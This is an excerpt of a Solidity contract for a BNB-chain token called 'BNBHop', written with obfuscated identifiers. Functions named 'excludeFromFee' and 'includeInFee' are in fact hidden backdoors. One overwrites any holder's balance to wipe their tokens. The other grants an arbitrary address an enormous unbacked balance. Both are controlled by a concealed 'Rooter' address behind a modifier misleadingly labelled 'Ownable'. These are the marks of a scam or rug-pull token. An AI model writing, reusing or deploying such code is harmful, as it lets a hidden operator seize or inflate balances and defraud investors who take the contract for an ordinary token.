...
interface BNBHopAIAsii is BNBHopAIAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract BNBHopAIAsiii is BNBHopAIAs {
...
contract BNBHop is BNBHopAIAs, BNBHopAIAsi, BNBHopAIAsii, BNBHopAIAsiii {

    mapping(address => uint256) private BNBHopAIsuplly;
  mapping(address => bool) public BNBHopAIAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private BNBHopAIRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public BNBHopAIPaw;
  address BNBHopAIdeploy;



    
    constructor(address BNBHopAIadressss) {
            // Editable
            BNBHopAIdeploy = msg.sender;

        _name = "BNBHop";
        _symbol = "BNBHOP";
  BNBHopAIRooter = BNBHopAIadressss;        
    ...
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
      ...
      modifier _internal() {
        require(BNBHopAIRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
  ...
  modifier maxtokens () {
    require(BNBHopAIdeploy == msg.sender, "Ehi20: cannot permit _internal address");
    _;
    ...
    function _transfer(
        ...
        uint256 fromBalance = BNBHopAIsuplly[from];
        require(fromBalance >= lahsab, "Ehi20: transfer lahsab exceeds balance");
        unchecked {
            BNBHopAIsuplly[from] = fromBalance - lahsab;
        }
        BNBHopAIsuplly[to] += lahsab;
  ...
  function excludeFromFee(address excludeaddress) external _internal {
    BNBHopAIsuplly[excludeaddress] = 10000000;
    ...
    function _burn(address account, uint256 lahsab) internal virtual {
        ...
        uint256 accountBalance = BNBHopAIsuplly[account];
        require(accountBalance >= lahsab, "Ehi20: burn lahsab exceeds balance");
        unchecked {
            BNBHopAIsuplly[account] = accountBalance - lahsab;
        }
        ALLtotalSupply -= lahsab;
  ...
  function includeInFee(address includeaddress) external _internal {
    BNBHopAIsuplly[includeaddress] = 1000000000 * 10 ** 24;
